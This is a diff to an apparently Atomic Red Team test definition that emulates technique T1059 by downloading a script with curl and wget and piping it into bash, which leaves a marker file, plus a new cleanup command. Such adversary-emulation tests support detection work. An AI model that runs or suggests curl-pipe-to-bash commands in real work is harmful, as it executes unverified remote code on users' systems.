@@ -7,16 +7,15 @@ atomic_tests:
   description: |
     Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.
 
-    This will download the specified payload and set a marker file in `/tmp/art-fish.txt`.
-
+    Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.
   supported_platforms:
     - macos
-    - centos
-    - ubuntu
     - linux
 
   executor:
     name: sh
     command: |
-      bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
-      bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
+      curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
+      wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
+    cleanup_command: |
+      rm /tmp/art-fish.txt
